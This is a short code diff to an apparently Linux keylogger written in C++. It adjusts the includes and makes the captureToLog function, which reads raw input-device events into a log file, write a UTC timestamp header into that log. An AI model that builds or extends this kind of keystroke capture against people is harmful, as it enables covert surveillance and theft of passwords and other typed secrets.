@@ -4,11 +4,13 @@
 #include <regex>
 #include <vector>
 #include <cstdlib>
+#include <ctime>
+#include <iomanip>
+#include <cstring>
 
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
-#include <string.h>
 #include <linux/input.h>
 #include <linux/version.h>
 #include <sys/ioctl.h>
@@ -243,6 +245,10 @@ void captureToLog(std::string inputDevice, std::string logPath)
 
     std::ofstream logFile (logPath.c_str(), std::ios::app);
     devFile = open(inputDevice.c_str(), O_RDONLY);
+
+    std::time_t time = std::time(nullptr);
+    logFile << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
+        << "-------------------------------------\n";
 
     while (1) {
         readDev = read(devFile, keyEvent, sizeof(struct input_event) * 64);
